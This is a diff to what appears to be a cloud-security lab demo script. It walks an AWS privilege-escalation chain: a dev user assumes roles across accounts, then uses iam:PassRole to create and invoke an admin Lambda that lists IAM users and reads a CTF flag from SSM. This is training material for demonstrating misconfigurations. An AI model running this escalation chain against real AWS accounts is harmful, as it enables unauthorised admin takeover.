@@ -82,9 +82,6 @@ source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
 restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
-
 echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
 echo ""
 
@@ -175,12 +172,20 @@ def lambda_handler(event, context):
         response = iam.list_users()
         users = response.get('Users', [])
 
+        # Retrieve the CTF flag from SSM Parameter Store using admin privileges
+        ssm = boto3.client('ssm')
+        flag_param = ssm.get_parameter(
+            Name='/pathfinding-labs/flags/passrole-lambda-admin-to-admin'
+        )
+        flag_value = flag_param['Parameter']['Value']
+
         return {
             'statusCode': 200,
             'body': json.dumps({
                 'message': 'Lambda function executed with admin privileges!',
                 'userCount': len(users),
-                'users': [user['UserName'] for user in users]
+                'users': [user['UserName'] for user in users],
+                'flag': flag_value
             })
         }
     except Exception as error:
@@ -248,6 +253,24 @@ if [ $? -eq 0 ]; then
             echo "✅ SUCCESS: Lambda function has admin access!"
             echo "The function was able to list IAM users, proving admin privileges."
             ATTACK_SUCCESS=true
+
+            # [EXPLOIT] Step 5: Capture the CTF flag
+            # The Lambda function ran as pl-Lambda-admin (AdministratorAccess) and retrieved
+            # the flag from SSM Parameter Store as part of its execution. Parse it from the response.
+            echo ""
+            echo -e "${YELLOW}Step 5: Capturing CTF flag from Lambda response${NC}"
+            FLAG_PARAM_NAME="/pathfinding-labs/flags/passrole-lambda-admin-to-admin"
+            BODY_JSON=$(cat /tmp/lambda_response.json | jq -r '.body // empty')
+            FLAG_VALUE=$(echo "$BODY_JSON" | jq -r '.flag // empty' 2>/dev/null)
+
+            show_attack_cmd "Attacker (Lambda as admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text --region us-east-1"
+
+            if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "null" ]; then
+                echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+            else
+                echo -e "${RED}✗ Failed to extract flag from Lambda response${NC}"
+                ATTACK_SUCCESS=false
+            fi
         else
             echo "❌ Lambda function executed but did not demonstrate admin access"
             echo "Expected success message not found in response"
@@ -277,6 +300,9 @@ unset AWS_ACCESS_KEY_ID
 unset AWS_SECRET_ACCESS_KEY
 unset AWS_SESSION_TOKEN
 
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -286,20 +312,27 @@ fi
 
 echo ""
 if [ "$ATTACK_SUCCESS" = "true" ]; then
-    echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
-    echo "The attack successfully demonstrated multi-hop privilege escalation:"
+    echo -e "${GREEN}========================================${NC}"
+    echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+    echo -e "${GREEN}========================================${NC}"
+    echo -e "\n${YELLOW}Attack Summary:${NC}"
     echo "1. Dev user pl-pathfinding-starting-user-dev assumed dev role pl-lambda-prod-updater"
-    echo "2. Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
-    echo "3. Used iam:PassRole permission to create Lambda with admin role"
+    echo "2. Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater cross-account"
+    echo "3. Used iam:PassRole permission to create Lambda with admin role pl-Lambda-admin"
     echo "4. Lambda function executed with full admin privileges"
-    echo "5. Confirmed admin access by listing IAM users"
-    echo ""
-    echo "⚠️  This demonstrates a critical multi-hop cross-account privilege escalation vulnerability!"
+    echo "5. Lambda retrieved CTF flag from SSM Parameter Store: $FLAG_VALUE"
+
+    echo -e "\n${YELLOW}Attack Path:${NC}"
+    echo -e "  pl-pathfinding-starting-user-dev → (sts:AssumeRole)"
+    echo -e "  → pl-lambda-prod-updater (dev) → (sts:AssumeRole cross-account)"
+    echo -e "  → pl-lambda-updater (prod) → (iam:PassRole + lambda:CreateFunction)"
+    echo -e "  → pl-Lambda-admin → (lambda:InvokeFunction)"
+    echo -e "  → Lambda as admin → (ssm:GetParameter) → CTF Flag"
 
     # Output standardized test results
     echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:SUCCESS"
-    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Successfully demonstrated multi-hop cross-account PassRole privilege escalation to Lambda admin"
-    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:dev_role_assumed=true,prod_role_assumed=true,lambda_created=true,admin_access_confirmed=true"
+    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Successfully demonstrated multi-hop cross-account PassRole privilege escalation to Lambda admin and captured CTF flag"
+    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:dev_role_assumed=true,prod_role_assumed=true,lambda_created=true,admin_access_confirmed=true,flag_captured=true"
 else
     echo "❌ ATTACK FAILED!"
     echo "=================="
